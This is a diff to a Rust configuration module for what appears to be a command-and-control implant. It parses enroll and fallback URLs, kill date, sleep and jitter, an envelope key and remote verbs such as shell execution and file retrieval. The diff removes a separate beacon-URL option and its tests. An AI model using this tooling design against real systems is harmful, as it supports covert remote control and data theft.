@@ -9,10 +9,6 @@ use serde_json::Value;
 #[derive(Clone, Debug)]
 pub struct Profile {
     pub enroll_url: String,
-    /// The contact front when the bake names a split (enroll on one front,
-    /// contacts on another); empty derives each contact URL from the enroll
-    /// front that answered.
-    pub beacon_url: String,
     pub fallback_enroll_urls: Vec<String>,
     pub ca_pem: String,
     /// The TLS trust posture: "pinned" (the default -- the CA above is the
@@ -56,10 +52,6 @@ impl Profile {
         let map: Value = serde_json::from_slice(&raw).ok()?;
         Some(Profile {
             enroll_url: field(&map, "enrollURL")?.to_string(),
-            // The split-socket shape's contact front (the beaconURL key,
-            // already path-stripped by the bake); absent keeps the derived
-            // single-front walk.
-            beacon_url: strip_trailing_path(field(&map, "beaconURL").unwrap_or("")),
             fallback_enroll_urls: map
                 .get("fallbackEnrollURLs")
                 .and_then(Value::as_array)
@@ -106,10 +98,6 @@ impl Profile {
         let envelope_key = std::env::var("ROD_ENVELOPE_KEY").unwrap_or_default();
         Some(Profile {
             enroll_url,
-            // The dev shape's split-socket override: the contact front when
-            // enroll and contacts ride different fronts (the probe-shaped
-            // harness runs ride exactly this).
-            beacon_url: strip_trailing_path(&std::env::var("ROD_BEACON_URL").unwrap_or_default()),
             fallback_enroll_urls: fallbacks,
             ca_pem: std::env::var("ROD_CA_CERT").unwrap_or_default(),
             tls_trust: std::env::var("ROD_TLS_TRUST").unwrap_or_else(|_| "pinned".into()),
@@ -187,22 +175,6 @@ pub fn apply_path(url: &str, path: &str) -> String {
     }
 }
 
-/// Reduces a beacon URL to scheme and authority: the contact route is fixed,
-/// so whatever path a baked or typed beacon URL carries is dropped.
-fn strip_trailing_path(url: &str) -> String {
-    if url.is_empty() {
-        return String::new();
-    }
-    match url.find("://") {
-        Some(at) => {
-            let after = &url[at + 3..];
-            let authority = after.split('/').next().unwrap_or(after);
-            format!("{}://{authority}", &url[..at])
-        }
-        None => url.to_string(),
-    }
-}
-
 /// One duration token in the profile's vocabulary: a Go-style duration
 /// ("30s", "5m", "1m30s") or a bare number read as seconds.
 pub fn parse_duration(text: &str) -> f64 {
@@ -273,7 +245,6 @@ mod tests {
     fn minimal() -> Profile {
         Profile {
             enroll_url: "https://front.example".into(),
-            beacon_url: String::new(),
             fallback_enroll_urls: Vec::new(),
             ca_pem: String::new(),
             tls_trust: "pinned".into(),
@@ -294,7 +265,7 @@ mod tests {
     #[test]
     fn the_full_bake_reads_every_contract_key() {
         let baked = bake(
-            r#"{"enrollURL":"https://front.example/old","beaconURL":"https://beacon.example/contact","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","tlsTrust":"public","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
+            r#"{"enrollURL":"https://front.example/old","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","tlsTrust":"public","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
         );
         let profile = Profile::from_baked(&baked).expect("the bake parses");
         assert_eq!(profile.enroll_url, "https://front.example/old");
@@ -302,9 +273,6 @@ mod tests {
         // front whose publicly-trusted chain the dials validate.
         assert_eq!(profile.tls_trust, "public");
         assert!(profile.public_tls());
-        // The contact front keeps scheme and authority only: the route is
-        // the server's, not the bake's.
-        assert_eq!(profile.beacon_url, "https://beacon.example");
         assert_eq!(
             profile.fallback_enroll_urls,
             vec!["https://two.example".to_string()]
@@ -334,7 +302,6 @@ mod tests {
         assert_eq!(profile.request_timeout_seconds, 30.0);
         assert_eq!(profile.contact_envelope, "none");
         assert_eq!(profile.kill_date, None);
-        assert_eq!(profile.beacon_url, "");
         assert!(profile.fallback_enroll_urls.is_empty());
         // The trust posture defaults to pinned -- a bake names public only
         // when the front is a real domain with a public certificate.
